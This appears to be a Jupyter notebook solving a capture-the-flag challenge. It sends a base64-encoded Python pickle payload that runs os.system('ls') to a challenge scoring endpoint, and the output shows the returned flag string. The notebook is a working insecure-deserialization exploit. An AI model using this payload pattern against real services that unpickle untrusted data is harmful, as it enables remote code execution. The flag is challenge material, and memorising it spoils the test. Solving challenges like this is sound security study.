{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "initial_id",
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "outputs": [
    {
     "data": {
      "text/plain": "{'flag': 'gAAAAABlMuSrPZnxnJo6DtJeIff2Iynm0IlqHlUjVoOEG-A1oI65sr5K99SjvLZHuhPTLXNR34aituMIHNKclthJ5k2y2z1WHEcZawDIZ3CiPA1HajNhGHl89YQtOm8d4GON7ygRYkCr0QT4XBYN8b2LYsmKk9PWOmXONgHiIXtKpBY82OagRZU='}"
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "import base64\n",
    "import pickle\n",
    "import os\n",
    "\n",
    "class Benign(object):\n",
    "    def s(self):\n",
    "        # Note: this will only list files in your directory.\n",
    "        # It is a proof of concept.\n",
    "        return (os.system, ('ls',))\n",
    "\n",
    "obj = pickle.dumps(Benign().s())\n",
    "input_data = base64.b64encode(obj).decode()\n",
    "\n",
    "def query(input_data):\n",
    "    response = requests.post(\"http://pickle.advml.com/score\", json={\"data\": input_data})\n",
    "    return response.json()\n",
    "\n",
    "query(input_data)"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2023-10-20T20:35:55.846226900Z",
     "start_time": "2023-10-20T20:35:55.402198500Z"
    }
   },
   "id": "a6a3f7a66a366d6b"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
